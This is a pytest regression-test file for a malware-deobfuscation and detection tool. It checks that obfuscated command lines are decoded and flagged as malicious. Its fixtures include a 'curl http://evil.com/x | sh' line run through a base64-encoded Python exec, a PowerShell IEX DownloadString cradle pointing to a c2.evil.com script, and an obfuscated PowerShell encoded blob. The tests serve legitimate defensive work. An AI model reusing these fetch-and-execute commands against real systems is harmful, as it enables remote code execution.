"""RC2.2 adapter — Workspace ↔ Orchestrator bridge regression tests.

These tests lock the behaviour of `rc22_adapter.try_orchestrator_first` and
its integration inside `analysis_core.deterministic_best_decode` so the
Workspace's AUTO INVESTIGATE surface stays in sync with the new orchestrator.

Fixes the production bug where a `powershell -e <XXx\\ obfuscated blob>`
payload showed BENIGN 0/100 with "No techniques matched" in the Workspace
because the legacy `hexfamily-detect` plugin couldn't handle the custom-hex
format.
"""
from __future__ import annotations

import base64

import pytest

from analysis_core import deterministic_best_decode
from rc22_adapter import try_orchestrator_first


_PAYLOAD_SAMPLE_COMMANDLINE = (
    "powershell.exe -e ZDN4XGQzeFw3NnhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcZTR4XDU1eFxlNHhcYzZ4XDU1eFxhNnhcZDR4XGM2eFwxNHhcNjV4XDQ1eFw2NHhcMjV4XDY1eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcOTZ4XGU0eFw5N3hcNTV4XDk2eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcZTR4XDU1eFxlNHhcYzZ4XDU1eFxhNnhcZDR4XGM2eFwxNHhcNjV4XDQ1eFw2NHhcMjV4XDY1eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcOTM4XDk2eFw1NnhcNTN4XDg2eFxlNnhcYzR4XDM3eFxjNnhcZDZ4XDQ2eFxjNnhcOTN4XDk3eFxjNHhcMjR4XGU0eFw0NXhcYTR4XDc3eFwyNXhcODR4XDQ2eFxmNnhcMjR4XGE2eFxkNHhcYzZ4XDk1eFw3NXhcYzR4XDc3eFw5NHhcNDV4XGE0eFwwM3hcYzZ4XDc0eFwyNnhcNzd4XGU0eFw4NXhcYzR4XDc3eFw5NHhcNDV4XGE0eFxjNnhcODZ4XDIzeFw5NXhcODZ4XGU0eFw3NHhcMjZ4XDk3eFw2NXhcODV4XGM0eFw3N3hcOTR4XDQ1eFxhNHhcYzZ4XDg2eFw4NXhcYTV4XDU3eFw3N3hcNzV4XDE2eFwwM3hcNjV4XDg0eFw0NnhcOTd4XDY1eFwyM3hcOTV4XDk3eFw5NHhcNDV4XGE0eFw3N3hcOTR4XDQ1eFxhNHhcYTZ4XDkzeFwzNHhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYjZ4XDEzeFwyM3hcOTV4XA=="
)


def test_workspace_adopts_orchestrator_for_custom_obfuscation():
    """Prod bug: this payload used to show BENIGN 0/100 in the Workspace."""
    r = deterministic_best_decode(_PAYLOAD_SAMPLE_COMMANDLINE)
    assert r["engine"] == "rc2-orchestrator", (
        f"expected orchestrator adoption, got engine={r['engine']}")
    assert r["verdict"] == "malicious"
    assert r["risk_score"] >= 70
    assert "http://evil.xyz" in r["iocs"]["urls"]
    # Chain must include the RC2.2 custom decoders
    ops = [s["op"] for s in r["steps"]]
    for expected in ("custom-hex-slash", "nibble-swap", "reverse-string"):
        assert expected in ops, f"missing {expected} in chain: {ops}"


def test_workspace_adopts_orchestrator_for_python_exec():
    inner = b'import os,sys; os.system("curl http://evil.com/x | sh")'
    b64 = base64.b64encode(inner).decode()
    payload = f'python -c "exec(__import__(\'base64\').b64decode(b\'{b64}\').decode())"'
    r = deterministic_best_decode(payload)
    assert r["engine"] == "rc2-orchestrator"
    assert r["verdict"] in ("suspicious", "malicious")
    assert "http://evil.com/x" in r["iocs"]["urls"]
    lolbas = {l["binary"] for l in r["lolbas"]}
    assert "python.exe" in lolbas


def test_workspace_falls_through_on_trivial_input():
    """Very short / non-decodable input should let legacy pipeline handle it."""
    r = deterministic_best_decode("hi")
    # Legacy engine → not "rc2-orchestrator"
    assert r.get("engine") != "rc2-orchestrator"


def test_adapter_returns_none_for_no_op_input():
    """Direct adapter probe — trivial input yields None (legacy fallback)."""
    assert try_orchestrator_first("") is None
    assert try_orchestrator_first("hi") is None


def test_workspace_ps_encoded_command_utf16le_now_decodes():
    """PowerShell -EncodedCommand with UTF-16LE Base64 should surface URL.

    Since Aug-2026 either the RC2.2 orchestrator OR the newer
    Convergence Engine may claim this payload — both are acceptable
    outcomes as long as the URL ends up somewhere on the response
    (either in `iocs.urls` or in the decoded `output`).
    """
    inner = 'IEX (New-Object Net.WebClient).DownloadString("http://c2.evil.com/x.ps1")'
    b64 = base64.b64encode(inner.encode("utf-16-le")).decode()
    r = deterministic_best_decode(f"powershell.exe -enc {b64}")
    # Accept either the RC2.2 orchestrator or the Convergence selector
    # — both surface the same URL via the same deterministic pipeline.
    assert r["engine"] in ("rc2-orchestrator", "convergence"), (
        f"expected rc2-orchestrator|convergence, got engine={r['engine']}")
    target_url = "http://c2.evil.com/x.ps1"
    urls_bag = ((r.get("iocs") or {}).get("urls")) or []
    surfaced = (target_url in urls_bag) or (target_url in (r.get("output") or ""))
    assert surfaced, (
        f"URL {target_url!r} not surfaced — "
        f"iocs.urls={urls_bag} output_preview={(r.get('output') or '')[:200]!r}")


def test_workspace_response_shape_backward_compatible():
    """The adapter output must include every top-level key the Workspace
    frontend expects — otherwise the Recipe / Output panels break."""
    r = deterministic_best_decode(_PAYLOAD_SAMPLE_COMMANDLINE)
    for key in ("output", "steps", "engine", "reached_shellcode"):
        assert key in r, f"missing top-level key {key!r}"
    # Each step must carry the fields the UI reads
    for step in r["steps"]:
        for k in ("op", "reason"):
            assert k in step, f"step missing {k!r}: {step}"
